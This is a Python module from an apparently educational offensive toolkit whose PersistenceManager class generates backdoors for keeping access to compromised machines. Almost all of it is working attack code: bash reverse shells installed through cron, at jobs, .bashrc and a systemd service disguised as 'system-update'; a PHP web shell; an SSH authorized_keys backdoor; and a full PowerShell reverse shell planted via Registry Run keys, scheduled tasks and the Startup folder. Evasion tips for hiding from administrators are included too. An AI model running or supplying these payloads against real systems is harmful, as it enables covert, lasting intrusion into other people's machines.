"""
Persistence mechanisms for maintaining access
"""

from typing import Dict, List, Optional
from learnshells.utils.logger import Logger


class PersistenceManager:
    """Manage persistence mechanisms for maintaining access."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize persistence manager.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
        self.target_os = "linux"  # linux or windows
        self.installed_methods = []
    
    def set_target_os(self, os_type: str):
        """
        Set target operating system.
        
        Args:
            os_type: Operating system (linux or windows)
        """
        self.target_os = os_type.lower()
        self.logger.debug(f"Target OS set to: {self.target_os}")
    
    # ========== Linux Persistence Methods ==========
    
    def generate_cron_job(
        self,
        lhost: str,
        lport: int,
        interval: str = "*/5 * * * *"
    ) -> Dict[str, str]:
        """
        Generate cron job for persistence.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            interval: Cron interval (default: every 5 minutes)
            
        Returns:
            Dict with cron job details
        """
        # Reverse shell payload
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        cron_line = f"{interval} {payload}"
        
        commands = {
            "install_user": f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -',
            "install_file": f'echo "{cron_line}" >> /var/spool/cron/crontabs/$(whoami)',
            "check": "crontab -l",
            "remove": f'crontab -l | grep -v "{lhost}" | crontab -',
            "test": "crontab -l | grep bash"
        }
        
        self.logger.success(
            "Generated cron job persistence",
            explain="Cron job will attempt to reconnect every 5 minutes. "
                   "If your shell dies, it will automatically reconnect. "
                   "This is stealthy because cron jobs are normal on Linux systems."
        )
        
        return {
            "type": "cron",
            "interval": interval,
            "payload": payload,
            "cron_line": cron_line,
            "commands": commands,
            "stealth": "medium",
            "reliability": "high"
        }
    
    def generate_ssh_key(self, key_name: str = "id_rsa") -> Dict[str, str]:
        """
        Generate SSH key backdoor.
        
        Args:
            key_name: SSH key filename
            
        Returns:
            Dict with SSH key commands
        """
        commands = {
            "generate": f"ssh-keygen -t rsa -N '' -f /tmp/{key_name}",
            "setup_dir": "mkdir -p ~/.ssh && chmod 700 ~/.ssh",
            "add_key": f"cat /tmp/{key_name}.pub >> ~/.ssh/authorized_keys",
            "set_perms": "chmod 600 ~/.ssh/authorized_keys",
            "download": f"cat /tmp/{key_name}  # Copy private key to your machine",
            "cleanup": f"rm /tmp/{key_name} /tmp/{key_name}.pub",
            "connect": f"ssh -i {key_name} user@target"
        }
        
        self.logger.success(
            "Generated SSH key backdoor",
            explain="SSH key allows passwordless authentication. "
                   "Much stealthier than cron jobs and more reliable. "
                   "Admins rarely check authorized_keys files."
        )
        
        return {
            "type": "ssh_key",
            "commands": commands,
            "stealth": "high",
            "reliability": "very_high"
        }
    
    def generate_web_backdoor(
        self,
        lhost: str,
        lport: int,
        webroot: str = "/var/www/html",
        filename: str = "config.php"
    ) -> Dict[str, str]:
        """
        Generate web shell backdoor.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            webroot: Web root directory
            filename: Backdoor filename
            
        Returns:
            Dict with web backdoor details
        """
        # PHP web backdoor with command execution and reverse shell
        php_backdoor = f"""<?php
if(isset($_GET['cmd'])) {{
    system($_GET['cmd']);
}} elseif(isset($_GET['shell'])) {{
    $sock=fsockopen("{lhost}",{lport});
    exec("/bin/sh -i <&3 >&3 2>&3");
}}
?>"""
        
        # Alternative minimal backdoor
        minimal_backdoor = "<?php system($_GET['cmd']); ?>"
        
        commands = {
            "create": f"echo '{php_backdoor}' > {webroot}/{filename}",
            "create_hidden": f"echo '{php_backdoor}' > {webroot}/.{filename}",
            "create_nested": f"echo '{php_backdoor}' > {webroot}/includes/{filename}",
            "create_minimal": f"echo '{minimal_backdoor}' > {webroot}/{filename}",
            "test_cmd": f"curl http://target.com/{filename}?cmd=whoami",
            "trigger_shell": f"curl http://target.com/{filename}?shell=1",
            "remove": f"rm {webroot}/{filename}"
        }
        
        self.logger.success(
            "Generated web backdoor",
            explain="Web backdoor allows command execution via HTTP requests. "
                   "Access it at: http://target/{filename}?cmd=whoami "
                   "Or trigger reverse shell: http://target/{filename}?shell=1"
        )
        
        return {
            "type": "web_backdoor",
            "code": php_backdoor,
            "minimal_code": minimal_backdoor,
            "webroot": webroot,
            "filename": filename,
            "commands": commands,
            "stealth": "medium",
            "reliability": "high"
        }
    
    def generate_systemd_service(
        self,
        lhost: str,
        lport: int,
        service_name: str = "system-update"
    ) -> Dict[str, str]:
        """
        Generate systemd service for persistence.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            service_name: Service name
            
        Returns:
            Dict with systemd service details
        """
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        
        service_path = f"/etc/systemd/system/{service_name}.service"
        
        commands = {
            "create": f"echo '{service_content}' > {service_path}",
            "reload": "systemctl daemon-reload",
            "enable": f"systemctl enable {service_name}.service",
            "start": f"systemctl start {service_name}.service",
            "status": f"systemctl status {service_name}.service",
            "disable": f"systemctl disable {service_name}.service",
            "stop": f"systemctl stop {service_name}.service",
            "remove": f"rm {service_path}"
        }
        
        self.logger.success(
            "Generated systemd service",
            explain="Systemd service runs at boot and automatically restarts if killed. "
                   "Requires root access to install. Very reliable but easier to detect."
        )
        
        return {
            "type": "systemd",
            "content": service_content,
            "service_path": service_path,
            "service_name": service_name,
            "commands": commands,
            "stealth": "low",
            "reliability": "very_high",
            "requires": "root"
        }
    
    def generate_bashrc_backdoor(
        self,
        lhost: str,
        lport: int,
        target_user: str = "current"
    ) -> Dict[str, str]:
        """
        Generate .bashrc backdoor.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            target_user: Target user (current, root, or username)
            
        Returns:
            Dict with bashrc backdoor commands
        """
        # Background the connection to not block shell startup
        backdoor_line = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &"
        
        if target_user == "current":
            bashrc_path = "~/.bashrc"
        elif target_user == "root":
            bashrc_path = "/root/.bashrc"
        else:
            bashrc_path = f"/home/{target_user}/.bashrc"
        
        commands = {
            "install": f"echo '{backdoor_line}' >> {bashrc_path}",
            "install_global": f"echo '{backdoor_line}' >> /etc/bash.bashrc",
            "install_profile": f"echo '{backdoor_line}' >> ~/.profile",
            "check": f"tail {bashrc_path}",
            "remove": f"sed -i '/{lhost}/d' {bashrc_path}",
            "test": f"grep '{lhost}' {bashrc_path}"
        }
        
        self.logger.success(
            "Generated .bashrc backdoor",
            explain=".bashrc runs every time user opens a shell. "
                   "Triggers when user logs in via SSH, opens terminal, or starts bash. "
                   "Very stealthy but only works when user is active."
        )
        
        return {
            "type": "bashrc",
            "backdoor_line": backdoor_line,
            "target_path": bashrc_path,
            "commands": commands,
            "stealth": "high",
            "reliability": "medium",
            "trigger": "user_login"
        }
    
    def generate_at_job(
        self,
        lhost: str,
        lport: int,
        delay: str = "now + 5 minutes"
    ) -> Dict[str, str]:
        """
        Generate at job for one-time delayed execution.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            delay: Delay specification
            
        Returns:
            Dict with at job commands
        """
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        commands = {
            "install": f"echo '{payload}' | at {delay}",
            "list": "atq",
            "check": "at -l",
            "remove": "atrm <job_number>",
            "view": "at -c <job_number>"
        }
        
        self.logger.success(
            "Generated at job",
            explain="At job executes command once at specified time. "
                   "Good for delayed execution or timed reconnection."
        )
        
        return {
            "type": "at_job",
            "payload": payload,
            "delay": delay,
            "commands": commands,
            "stealth": "high",
            "reliability": "medium"
        }
    
    # ========== Windows Persistence Methods ==========
    
    def generate_windows_registry(
        self,
        lhost: str,
        lport: int,
        key_name: str = "WindowsUpdate"
    ) -> Dict[str, str]:
        """
        Generate Windows registry persistence.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            key_name: Registry key name
            
        Returns:
            Dict with registry commands
        """
        # PowerShell reverse shell payload
        ps_payload = f'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
        
        commands = {
            "install_hkcu": f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /t REG_SZ /d "{ps_payload}" /f',
            "install_hklm": f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /t REG_SZ /d "{ps_payload}" /f',
            "check_hkcu": 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
            "check_hklm": 'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
            "remove_hkcu": f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /f',
            "remove_hklm": f'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /f'
        }
        
        self.logger.success(
            "Generated Windows registry persistence",
            explain="Registry Run key executes at user login. "
                   "HKCU (current user) doesn't require admin. "
                   "HKLM (local machine) requires admin but runs for all users."
        )
        
        return {
            "type": "windows_registry",
            "payload": ps_payload,
            "key_name": key_name,
            "commands": commands,
            "stealth": "medium",
            "reliability": "high"
        }
    
    def generate_windows_scheduled_task(
        self,
        lhost: str,
        lport: int,
        task_name: str = "SystemMaintenance"
    ) -> Dict[str, str]:
        """
        Generate Windows scheduled task.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            task_name: Task name
            
        Returns:
            Dict with scheduled task commands
        """
        ps_payload = f'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
        
        commands = {
            "create_5min": f'schtasks /create /tn "{task_name}" /tr "{ps_payload}" /sc minute /mo 5 /f',
            "create_boot": f'schtasks /create /tn "{task_name}" /tr "{ps_payload}" /sc onstart /f',
            "create_logon": f'schtasks /create /tn "{task_name}" /tr "{ps_payload}" /sc onlogon /f',
            "run_now": f'schtasks /run /tn "{task_name}"',
            "query": f'schtasks /query /tn "{task_name}"',
            "delete": f'schtasks /delete /tn "{task_name}" /f'
        }
        
        self.logger.success(
            "Generated Windows scheduled task",
            explain="Scheduled task can run at boot, login, or on interval. "
                   "More flexible than registry Run key. "
                   "Can be configured to run with SYSTEM privileges."
        )
        
        return {
            "type": "windows_scheduled_task",
            "payload": ps_payload,
            "task_name": task_name,
            "commands": commands,
            "stealth": "medium",
            "reliability": "very_high"
        }
    
    def generate_windows_startup_folder(
        self,
        lhost: str,
        lport: int,
        filename: str = "update.bat"
    ) -> Dict[str, str]:
        """
        Generate Windows startup folder persistence.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            filename: Batch file name
            
        Returns:
            Dict with startup folder commands
        """
        bat_content = f'@echo off\npowershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
        
        startup_path = f'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}'
        
        commands = {
            "create": f'echo {bat_content} > "{startup_path}"',
            "list": 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
            "remove": f'del "{startup_path}"'
        }
        
        self.logger.success(
            "Generated Windows startup folder persistence",
            explain="Startup folder executes at user login. "
                   "Easy to install, doesn't require admin. "
                   "Visible to users who check startup folder."
        )
        
        return {
            "type": "windows_startup",
            "content": bat_content,
            "path": startup_path,
            "filename": filename,
            "commands": commands,
            "stealth": "low",
            "reliability": "high"
        }
    
    # ========== Display and Guidance Methods ==========
    
    def display_persistence_menu(self, os_type: str = "linux"):
        """
        Display persistence options menu.
        
        Args:
            os_type: Target OS type
        """
        self.logger.header(f"{os_type.upper()} Persistence Methods")
        
        if os_type.lower() == "linux":
            self._display_linux_menu()
        else:
            self._display_windows_menu()
    
    def _display_linux_menu(self):
        """Display Linux persistence menu."""
        methods = [
            {
                "name": "Cron Job",
                "difficulty": "Easy",
                "stealth": "⭐⭐⭐",
                "reliability": "⭐⭐⭐⭐⭐",
                "requires": "User access",
                "description": "Reconnects every 5 minutes"
            },
            {
                "name": "SSH Key",
                "difficulty": "Easy",
                "stealth": "⭐⭐⭐⭐⭐",
                "reliability": "⭐⭐⭐⭐⭐",
                "requires": "User access",
                "description": "Passwordless SSH access"
            },
            {
                "name": "Web Backdoor",
                "difficulty": "Easy",
                "stealth": "⭐⭐⭐",
                "reliability": "⭐⭐⭐⭐",
                "requires": "Web server access",
                "description": "HTTP-based command execution"
            },
            {
                "name": ".bashrc Backdoor",
                "difficulty": "Easy",
                "stealth": "⭐⭐⭐⭐",
                "reliability": "⭐⭐⭐",
                "requires": "User access",
                "description": "Triggers on user login"
            },
            {
                "name": "Systemd Service",
                "difficulty": "Medium",
                "stealth": "⭐⭐",
                "reliability": "⭐⭐⭐⭐⭐",
                "requires": "Root access",
                "description": "Runs at boot, auto-restarts"
            },
            {
                "name": "At Job",
                "difficulty": "Easy",
                "stealth": "⭐⭐⭐⭐",
                "reliability": "⭐⭐⭐",
                "requires": "User access",
                "description": "One-time delayed execution"
            }
        ]
        
        headers = ["Method", "Difficulty", "Stealth", "Reliability", "Requires", "Description"]
        rows = [[m["name"], m["difficulty"], m["stealth"], m["reliability"], m["requires"], m["description"]] for m in methods]
        
        self.logger.table(headers, rows)
    
    def _display_windows_menu(self):
        """Display Windows persistence menu."""
        methods = [
            {
                "name": "Registry Run Key",
                "difficulty": "Easy",
                "stealth": "⭐⭐⭐",
                "reliability": "⭐⭐⭐⭐⭐",
                "requires": "User access",
                "description": "Runs at user login"
            },
            {
                "name": "Scheduled Task",
                "difficulty": "Medium",
                "stealth": "⭐⭐⭐",
                "reliability": "⭐⭐⭐⭐⭐",
                "requires": "User access",
                "description": "Flexible timing options"
            },
            {
                "name": "Startup Folder",
                "difficulty": "Easy",
                "stealth": "⭐⭐",
                "reliability": "⭐⭐⭐⭐",
                "requires": "User access",
                "description": "Runs at user login"
            }
        ]
        
        headers = ["Method", "Difficulty", "Stealth", "Reliability", "Requires", "Description"]
        rows = [[m["name"], m["difficulty"], m["stealth"], m["reliability"], m["requires"], m["description"]] for m in methods]
        
        self.logger.table(headers, rows)
    
    def explain_persistence(self) -> str:
        """Explain persistence concepts."""
        explanation = """
🎓 PERSISTENCE EXPLAINED:

What is Persistence?
Persistence means maintaining access to a compromised system
even after:
• Your reverse shell dies
• System reboots
• User logs out
• Network connection drops

Why Do You Need Persistence?
Reverse shells are fragile:
• Network interruptions kill them
• Users might close terminals
• System reboots lose connections
• Exploits might not be repeatable

Persistence ensures you can reconnect anytime.

Types of Persistence:

1. SCHEDULED/AUTOMATED:
   • Cron jobs (Linux)
   • Scheduled tasks (Windows)
   • At jobs (Linux)
   → Automatically reconnect at intervals

2. LOGIN-BASED:
   • .bashrc/.profile (Linux)
   • Registry Run keys (Windows)
   • Startup folder (Windows)
   → Trigger when user logs in

3. SERVICE-BASED:
   • Systemd services (Linux)
   • Windows services
   → Run at boot, persist through reboots

4. ACCESS-BASED:
   • SSH keys (Linux)
   • Web backdoors
   → Alternative access methods

Persistence Trade-offs:

Stealth vs Reliability:
• High stealth = less likely detected, might fail
• High reliability = works always, easier to find

Root vs User:
• Root persistence = survives user changes
• User persistence = easier to install

Active vs Passive:
• Active = constant reconnection attempts
• Passive = waits for trigger (login, HTTP request)

Best Practices:

1. Multiple Methods:
   Don't rely on one method. Install 2-3 different
   persistence mechanisms as backup.

2. Stealth Matters:
   Admins check:
   • Cron jobs (sometimes)
   • Systemd services (frequently)
   • Registry Run keys (sometimes)
   • Startup folders (rarely)
   • SSH authorized_keys (rarely)
   • Web directories (rarely)

3. Clean Up:
   Remove persistence when done:
   • Professional ethics
   • Avoid legal issues
   • Leave system clean

Common Detection Methods:
• ps aux (check running processes)
• crontab -l (check cron jobs)
• systemctl list-units (check services)
• ls -la ~/.ssh (check SSH keys)
• netstat -tupln (check connections)

Evasion Tips:
• Use legitimate-sounding names
• Blend with normal system activity
• Avoid obvious ports (4444, 1234)
• Use common ports (443, 80, 53)
• Randomize timing intervals
• Hide in legitimate directories
"""
        return explanation
    
    def get_all_methods(self, os_type: str = "linux") -> List[str]:
        """
        Get list of all available persistence methods.
        
        Args:
            os_type: Target OS
            
        Returns:
            List of method names
        """
        if os_type.lower() == "linux":
            return [
                "cron_job",
                "ssh_key",
                "web_backdoor",
                "bashrc_backdoor",
                "systemd_service",
                "at_job"
            ]
        else:
            return [
                "registry",
                "scheduled_task",
                "startup_folder"
            ]
    
    def recommend_methods(self, user_level: str, os_type: str = "linux") -> List[Dict]:
        """
        Recommend persistence methods based on access level.
        
        Args:
            user_level: Access level (user or root)
            os_type: Target OS
            
        Returns:
            List of recommended methods with reasons
        """
        if os_type.lower() == "linux":
            if user_level == "root":
                return [
                    {"method": "systemd_service", "reason": "Most reliable, survives reboot"},
                    {"method": "ssh_key", "reason": "Stealthy, easy reconnection"},
                    {"method": "cron_job", "reason": "Auto-reconnect backup"}
                ]
            else:
                return [
                    {"method": "ssh_key", "reason": "Most stealthy and reliable"},
                    {"method": "cron_job", "reason": "Auto-reconnect if shell dies"},
                    {"method": "bashrc_backdoor", "reason": "Triggers on login"}
                ]
        else:
            if user_level == "admin":
                return [
                    {"method": "scheduled_task", "reason": "Most flexible and reliable"},
                    {"method": "registry", "reason": "Runs at boot for all users"}
                ]
            else:
                return [
                    {"method": "registry", "reason": "Easy to install, runs at login"},
                    {"method": "startup_folder", "reason": "Simple backup method"}
                ]
